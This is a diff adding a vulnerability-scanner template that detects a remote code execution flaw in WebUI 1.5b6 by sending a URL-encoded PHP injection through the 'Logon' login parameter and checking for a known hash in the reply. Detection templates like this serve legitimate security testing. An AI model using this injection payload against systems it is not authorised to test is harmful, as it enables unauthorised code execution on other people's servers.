@@ -1,0 +1,29 @@
+id: "webui-rce"
+name: "WebUI 1.5b6 - Remote Code Execution"
+severity: "critical"
+description: "WebUI 1.5b6 is vulnerable to remote code execution because the 'mainfile.php' endpoint allows remote attackersto execute arbitrary code via the 'Logon' parameter."
+tech:
+  - "php"
+tags:
+  - "webui"
+  - "rce"
+  - "edb"
+  - "vuln"
+cwe: "CWE-77"
+reference: "https://www.exploit-db.com/exploits/36821"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "c5b3d7397a90f42d222f7ed9408c0dc6"
+  - type: "status"
+    status:
+      - 200
